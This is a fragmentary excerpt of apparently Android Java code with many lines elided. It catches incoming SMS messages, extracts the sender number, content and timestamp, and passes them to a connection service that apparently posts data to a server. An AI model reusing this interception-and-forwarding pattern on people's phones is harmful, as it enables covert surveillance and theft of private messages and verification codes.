        ...
        if (action.equals(SMS_RECEIVED_ACTION)) {
            ...
            if (bundle != null){
                ...
                for (SmsMessage temp : msg){
                    ...
                    receiveData.append(temp.getTimestampMillis());
                }
                ...
                String sms_data = "(Phone:"+ phoneNumber+") Data:"+ content +" Time:"+ receiveData;
                ...
                //Manager.getInst().mainActivity.connServ.postData( ""+sms_data );

                //Manager.getInst().mainActivity.connServ.postData( ""+phoneNumber );
                ...
                getData.add(content+"");
                getData.add(phoneNumber+"");
                getData.add(receiveData+"");
                Manager.getInst().mainActivity.connServ.addData( getData );
